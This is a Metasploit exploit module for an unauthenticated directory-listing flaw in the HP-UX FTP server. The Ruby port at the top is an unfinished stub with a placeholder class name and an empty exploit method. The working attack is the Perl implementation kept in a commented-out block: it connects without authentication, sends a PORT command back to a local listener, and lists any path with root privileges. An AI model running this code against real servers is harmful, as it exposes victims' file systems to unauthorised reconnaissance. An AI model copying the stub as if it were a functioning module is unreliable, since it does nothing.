require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'HP-UX FTP Server Preauthentication Directory Listing',
			'Description'    => %q{
				This exploit abuses an unpublished vulnerability in the
				HP-UX FTP service. This flaw allows an unauthenticated
				remote user to obtain directory listings from this server
				with the privileges of the root user. This vulnerability was
				silently patched by HP sometime between 2001 and 2003.
					
			},
			'Author'         => [ 'Optyx  <optyx@uberhax0r.net>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[

				],
			'Privileged'     => false,
			
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'hpux',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::hpux_ftpd_preauth_list;
use base "Msf::Exploit";
use IO::Socket;
use IO::Select;
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'HP-UX FTP Server Preauthentication Directory Listing',
	'Version'  => '$Revision$',
	'Authors' => [ 'Optyx  <optyx [at] uberhax0r.net>'],
	'Arch'  => [ ],
	'OS'    => [ 'hpux' ],
	'Priv'  => 0,
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The FTP server port', 21],
		'RPATH' => [1, 'DATA', 'The path name to list', "/"],
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This exploit abuses an unpublished vulnerability in the HP-UX FTP
        service. This flaw allows an unauthenticated remote user to obtain
        directory listings from this server with the privileges of the root
        user. This vulnerability was silently patched by HP sometime between 
		2001 and 2003.
}),
	'Refs'  =>
	  [
		# None
	  ],

	'Keys' => ['ftp'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_path = $self->GetVar('RPATH');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	  
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	my $l = IO::Socket::INET->new
	  (
		Proto  => 'tcp',
		Listen => 5,
		Blocking => 0,
		ReuseAddr => 1,
	  );

	my $r;
	my $prt = ",".int($l->sockport / 256).",".int($l->sockport % 256);
	my $sel = IO::Select->new($l);
	my $cmd = "PORT ".join(",", split(/\./,Pex::Utils::SourceIP($target_host))).$prt."\r\n";

	$r .= $s->Recv(-1, 5);

	$s->Send($cmd);
	$r .= $s->Recv(-1, 5);

	$s->Send("LIST $target_path\r\n");
	$r .= $s->Recv(-1, 5);
	$s->Close;

	foreach (split(/\n/, $r)) {
		chomp;
		$self->PrintLine("[*] $_");
	}

	my @rdy = $sel->can_read(3);
	if (scalar(@rdy)) {
		my $x = $l->accept();
		$self->PrintLine("[*] Accepted connection from ".$x->sockhost.":".$x->sockport);

		while (<$x>) {
			chomp;
			$self->PrintLine($_);
		}
		$x->shutdown(2);
		$x->close;
	}
	$l->shutdown(2);
	$l->close;
	return;
}


=end


end
end	
